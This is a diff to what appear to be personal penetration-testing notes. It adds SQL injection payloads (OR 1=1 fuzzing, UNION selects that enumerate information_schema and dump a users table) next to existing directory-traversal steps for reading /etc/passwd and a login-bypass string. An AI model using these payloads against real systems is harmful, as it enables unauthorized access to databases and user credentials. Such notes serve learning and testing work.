@@ -16,8 +16,13 @@ RECON
     nmap -p 80 --script=firewalk.nse <IP Address>
 ----------
 WEB EXPLOITATION / SQL
-----------
-
+  SQL EXAMPLE: select column, column, 8 (placeholder) FROM database.table
+  FUZZING:
+    ?product=1 OR 1=1; ITERATE THROUGH AND ATTEMPT EVERYWHERE POSSIBLE UNTIL ABNORMAL RESULT DISCOVERED; MOVE FORWARD FROM HERE!!!
+  ON VULNERABLE PAGE ATTEMPT:
+    ?product=7 UNION select 1,3,2
+    ?product=7 UNION select table_schema,column_name,table_name FROM information_schema.columns;
+    ?product=7 UNION select username, name, user_id FROM siteusers.users;
 ----------
 METHODOLOGY: 
 WHEN DISCOVER IP OF INTEREST:
@@ -27,6 +32,7 @@ WHEN DISCOVER INPUT FIELD ON WEBSITE:
   - ATTEMPT DIRECTORY TRAVERSAL ../../../../ , LOOK AT /etc/passwd FOR USERS WITH SHELLS OR PERMS, /etc/host FOR NEW IPS
   - TO DISPLAY WHAT WAS SENT IN INPUT FIELD AFTER SUBMISSION: F12 -> NEWTWORK, REQUEST, ENABLE RAW, AFTER THIS: ADD "?" TO URL AFTER .php, THEN PASTE FINDINGS FROM THE REQUEST
   - OR TRY IN URL: ?username=tom' OR 1='1 & passwd=tom' OR 1='1
+
 ------------------------------------------------------------------------------------------------------------------------
 SCRIPTS 
 mybuff.py
